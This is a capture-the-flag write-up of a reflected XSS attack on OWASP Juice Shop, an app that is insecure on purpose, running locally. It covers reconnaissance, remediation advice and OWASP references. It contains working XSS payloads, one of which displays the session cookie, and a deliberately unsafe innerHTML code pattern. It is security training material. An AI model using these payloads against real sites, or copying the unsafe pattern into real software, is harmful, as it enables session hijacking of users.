# CTF Write-up: Reflected XSS — OWASP Juice Shop

**Platform:** TryHackMe / OWASP Juice Shop  
**Category:** Web · XSS  
**Difficulty:** Easy  
**Date:** 2024

---

## Overview

This write-up covers exploiting a **Reflected Cross-Site Scripting (XSS)** vulnerability in OWASP Juice Shop — a deliberately insecure web application used for security training.

---

## Reconnaissance

First, I explored the application to understand its structure:

```
Target: http://localhost:3000
Tech stack: Node.js, Angular, SQLite
```

I noticed the search bar reflects user input directly in the page without sanitization.

---

## Finding the Vulnerability

Navigated to the search functionality and tried a simple test string:

```
http://localhost:3000/#/search?q=test
```

The string `test` appeared in the DOM inside an `<h1>` tag — classic reflection.

---

## Exploitation

Injected a basic XSS payload:

```
http://localhost:3000/#/search?q=<script>alert('XSS')</script>
```

**Result:** Alert box appeared — the input was not sanitized before rendering.

Also tested an image-based payload that bypasses some basic filters:

```
<img src=x onerror="alert(document.cookie)">
```

This exposed the session cookie in the alert, confirming the vulnerability could be used for session hijacking.

---

## Root Cause

The application used Angular's `innerHTML` binding with user-controlled data without sanitization:

```javascript
// Vulnerable code pattern
this.searchResults = `Results for: ${userInput}`
element.innerHTML = this.searchResults  // unsafe!
```

---

## Remediation

1. **Encode output** — use `textContent` instead of `innerHTML`
2. **Content Security Policy** — add `Content-Security-Policy: script-src 'self'` header
3. **Input validation** — reject or strip HTML tags server-side
4. **Use framework sanitizers** — Angular's `DomSanitizer.sanitize()`

---

## OWASP Reference

- [A03:2021 – XSS](https://owasp.org/www-community/attacks/xss/)
- OWASP Testing Guide: [OTG-CLIENT-001](https://owasp.org/www-project-web-security-testing-guide/)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Browser DevTools | DOM inspection |
| Burp Suite | Request interception |
| OWASP Juice Shop | Target environment |

---

## Key Takeaways

- Always check if user input is reflected in the page source
- Test both URL parameters and form fields
- XSS can lead to session theft, phishing, and keylogging
- Modern frameworks have built-in XSS protection — use them correctly
